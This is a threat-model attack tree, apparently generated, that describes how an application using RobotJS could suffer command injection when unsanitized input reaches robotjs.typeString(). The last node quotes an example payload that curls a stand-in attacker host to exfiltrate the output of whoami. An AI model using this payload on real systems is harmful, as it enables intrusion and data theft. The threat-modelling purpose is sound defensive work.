## Attack Tree Path: [Compromise Application via RobotJS (Root Goal)](./attack_tree_paths/compromise_application_via_robotjs__root_goal_.md)

*   **Description:** The ultimate objective of the attacker is to successfully compromise the application that utilizes RobotJS. This could involve gaining unauthorized access, control, data theft, or disruption of services.

## Attack Tree Path: [Abuse of RobotJS Functionality via Application Logic Flaws (Application-Level Vulnerability Category)](./attack_tree_paths/abuse_of_robotjs_functionality_via_application_logic_flaws__application-level_vulnerability_category_74aa7c28.md)

*   **Description:** This category focuses on exploiting vulnerabilities in the application's code that uses RobotJS, rather than vulnerabilities within RobotJS itself. Attackers leverage weaknesses in how the application handles user input, manages logic, or secures its functionalities to misuse RobotJS's capabilities.

## Attack Tree Path: [Command Injection via RobotJS (High-Risk Attack Vector)](./attack_tree_paths/command_injection_via_robotjs__high-risk_attack_vector_.md)

*   **Description:** This is a particularly dangerous attack vector where an attacker aims to inject operating system commands through the application's use of RobotJS keyboard or mouse input functions.
*   **Likelihood:** High
*   **Impact:** High (Full System Compromise, Data Breach, Denial of Service)
*   **Effort:** Low
*   **Skill Level:** Novice
*   **Detection Difficulty:** Medium (Hard if proper logging and input validation are absent)

## Attack Tree Path: [Unsanitized Input Passed to RobotJS Keyboard/Mouse Functions (Vulnerable Point)](./attack_tree_paths/unsanitized_input_passed_to_robotjs_keyboardmouse_functions__vulnerable_point_.md)

*   **Description:** This is the specific point of vulnerability within the Command Injection path. It occurs when the application takes user-provided input and directly passes it to RobotJS functions like `robotjs.typeString()` without proper sanitization or validation.
*   **Vulnerability:** Lack of input sanitization allows attackers to insert malicious commands within the input string.

## Attack Tree Path: [Injecting OS commands or malicious scripts through text input simulated by RobotJS (High-Risk Attack Step)](./attack_tree_paths/injecting_os_commands_or_malicious_scripts_through_text_input_simulated_by_robotjs__high-risk_attack_ad53ec75.md)

*   **Description:** This is the final step in the Command Injection attack. By injecting specially crafted input strings containing OS commands, the attacker leverages RobotJS to simulate typing these commands into the operating system.  Because RobotJS operates at the OS level, these simulated keystrokes are executed as if a user were typing them directly.
*   **Example Attack:** An attacker might input a string like `$(curl attacker.com/exfiltrate?data=$(whoami)) #` into an application field that uses `robotjs.typeString()`. This could execute a command to exfiltrate the username to an attacker-controlled server.
